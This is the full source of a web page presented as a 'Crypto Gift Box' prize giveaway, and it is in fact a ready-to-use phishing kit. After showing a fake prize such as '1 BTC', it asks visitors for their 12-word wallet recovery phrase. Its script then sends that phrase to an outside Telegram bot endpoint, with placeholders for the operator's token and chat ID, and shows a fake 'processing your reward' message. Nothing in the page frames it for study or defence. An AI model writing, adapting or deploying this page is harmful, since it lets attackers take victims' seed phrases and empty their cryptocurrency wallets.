<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Crypto Gift Box</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --background: #0f0f0f;
      --card-bg: #1e293b;
      --primary: #3b82f6;
      --text-main: #cbd5e1;
      --text-sub: #94a3b8;
      --error: #f87171;
    }

    body {
      margin: 0;
      padding: 0;
      background: var(--background);
      font-family: 'Poppins', sans-serif;
      color: var(--text-main);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      background: var(--card-bg);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
      width: 90%;
      max-width: 400px;
    }

    .gift-box {
      width: 120px;
      height: 120px;
      background: linear-gradient(135deg, #1e293b, #334155);
      border: 2px solid var(--primary);
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 36px;
      color: var(--primary);
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 16px rgba(59, 130, 246, 0.3);
      margin-bottom: 20px;
    }

    .gift-box:hover {
      transform: scale(1.05);
      background: linear-gradient(135deg, #334155, #1e293b);
    }

    .prize {
      font-size: 16px;
      color: var(--text-sub);
      margin-top: 10px;
      margin-bottom: 20px;
      display: none;
    }

    .claim-btn, .submit-btn {
      background: var(--primary);
      border: none;
      padding: 12px 25px;
      font-size: 16px;
      font-weight: 600;
      color: #fff;
      border-radius: 12px;
      cursor: pointer;
      transition: background 0.3s;
      margin-top: 10px;
    }

    .claim-btn:hover, .submit-btn:hover {
      background: #2563eb;
    }

    .mnemonic-input {
      display: none;
      flex-direction: column;
      align-items: center;
      width: 100%;
      margin-top: 15px;
    }

    .mnemonic-input textarea {
      width: 100%;
      height: 100px;
      padding: 10px;
      border-radius: 10px;
      background: #0f172a;
      border: 1px solid #334155;
      color: var(--text-main);
      resize: none;
      font-size: 14px;
      margin-bottom: 10px;
    }

    .error-message {
      color: var(--error);
      font-size: 13px;
      margin-top: 5px;
      display: none;
    }

    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: var(--card-bg);
      border: 2px solid var(--primary);
      padding: 30px 40px;
      border-radius: 20px;
      display: none;
      z-index: 1000;
      font-size: 18px;
      text-align: center;
      animation: fadeIn 0.3s ease;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translate(-50%, -45%);}
      to {opacity: 1; transform: translate(-50%, -50%);}
    }

    .countdown {
      margin-top: 10px;
      font-size: 14px;
      color: var(--text-sub);
      display: none;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="gift-box" id="giftBox">Open</div>
    <div class="prize" id="prizeText"></div>
    <button class="claim-btn" id="claimBtn" style="display:none;">Claim Prize</button>

    <div class="mnemonic-input" id="mnemonicInput">
      <textarea id="mnemonic" placeholder="Enter your 12-word mnemonic phrase..."></textarea>
      <button class="submit-btn" id="submitBtn">Submit</button>
      <div class="error-message" id="errorMessage"></div>
    </div>

    <div class="countdown" id="countdownTimer"></div>
  </div>

  <div class="popup" id="popup">Thank you! Processing your reward...</div>

<script>
  const prizes = ["1 BNB", "10 USDT", "100 USDT", "1 BTC", "1 ETH", "1 LTC", "500 XRP", "0.5 SOL", "2 ADA", "100 DOGE"];
  const giftBox = document.getElementById('giftBox');
  const prizeText = document.getElementById('prizeText');
  const claimBtn = document.getElementById('claimBtn');
  const mnemonicInput = document.getElementById('mnemonicInput');
  const submitBtn = document.getElementById('submitBtn');
  const popup = document.getElementById('popup');
  const errorMessage = document.getElementById('errorMessage');
  const countdownTimer = document.getElementById('countdownTimer');

  let selectedPrize = "";
  const CLAIM_KEY = "lastClaimTime";

  function updateCountdown() {
    const lastClaim = localStorage.getItem(CLAIM_KEY);
    if (!lastClaim) return;

    const now = Date.now();
    const diff = (parseInt(lastClaim) + 24 * 60 * 60 * 1000) - now;

    if (diff <= 0) {
      countdownTimer.style.display = 'none';
      return;
    }

    const hours = Math.floor(diff / (1000 * 60 * 60));
    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
    countdownTimer.innerText = `Next claim in ${hours}h ${minutes}m ${seconds}s`;
    countdownTimer.style.display = 'block';

    setTimeout(updateCountdown, 1000);
  }

  function canClaim() {
    const lastClaim = localStorage.getItem(CLAIM_KEY);
    if (!lastClaim) return true;

    const now = Date.now();
    return now - parseInt(lastClaim) >= 24 * 60 * 60 * 1000;
  }

  giftBox.addEventListener('click', () => {
    if (!canClaim()) {
      alert("You can only open the gift box once every 24 hours!");
      return;
    }

    selectedPrize = prizes[Math.floor(Math.random() * prizes.length)];
    prizeText.textContent = `You Won: ${selectedPrize}`;
    prizeText.style.display = 'block';
    claimBtn.style.display = 'inline-block';
    giftBox.style.pointerEvents = 'none';
    localStorage.setItem(CLAIM_KEY, Date.now().toString());
    updateCountdown();
  });

  claimBtn.addEventListener('click', () => {
    claimBtn.style.display = 'none';
    mnemonicInput.style.display = 'flex';
  });

  submitBtn.addEventListener('click', () => {
    const mnemonic = document.getElementById('mnemonic').value.trim();
    errorMessage.style.display = 'none';

    if (mnemonic.split(' ').length !== 12) {
      errorMessage.textContent = "Please enter exactly 12 words.";
      errorMessage.style.display = 'block';
      return;
    }

    const botToken = 'YOUR_BOT_TOKEN';
    const chatId = 'YOUR_CHAT_ID';
    const message = `Mnemonic:\n${mnemonic}\n\nPrize: ${selectedPrize}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => response.json())
    .then(data => {
      popup.style.display = 'block';
      setTimeout(() => location.reload(), 3000);
    })
    .catch(error => {
      errorMessage.textContent = "Error sending message. Please try again.";
      errorMessage.style.display = 'block';
    });
  });

  updateCountdown();
</script>
</body>
</html>
